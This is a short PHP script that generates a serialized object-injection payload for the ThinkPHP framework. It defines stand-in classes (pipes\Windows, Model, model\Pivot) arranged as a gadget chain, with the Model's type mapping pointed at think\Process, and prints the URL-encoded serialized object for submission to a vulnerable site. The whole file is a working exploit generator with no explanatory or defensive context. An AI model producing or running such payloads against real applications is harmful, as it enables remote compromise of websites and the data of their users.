<?php
namespace think\process\pipes{
    class Windows{
        public function __construct($s){
            $this->files = array($s);
        }
    }

}

namespace think{
    class Model{
        protected $data = ["c014"=>"123"];    //参数
        protected $type = ["c014"=>"think\Process"];   //类名
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model{
    }
}


namespace{
    $string = new think\model\Pivot();
    $payload = new think\process\pipes\Windows($string);
    echo urlencode(serialize($payload));
}